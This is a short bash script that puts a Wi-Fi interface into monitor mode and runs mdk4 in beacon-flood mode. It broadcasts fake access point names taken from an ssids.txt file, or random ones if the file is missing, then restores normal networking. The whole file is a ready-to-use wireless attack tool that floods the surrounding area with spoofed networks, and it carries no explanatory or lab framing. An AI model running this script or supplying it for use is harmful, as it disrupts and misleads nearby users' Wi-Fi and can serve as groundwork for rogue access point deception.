#!/bin/bash

echo "Enter your Wi-Fi interface name (that supports monitor mode):"
read iface
sudo ifconfig $iface down
sudo airmon-ng check kill
sudo iwconfig $iface mode monitor
if [ -f ssids.txt ]; then
	echo "using ssids.txt ..."
	sudo mdk4 $iface b -f ssids.txt
else
	echo "No ssids.txt found going random"
	sudo mdk4 $iface b -s 20
fi 
sudo airmon-ng stop $iface

sudo systemctl restart NetworkManager
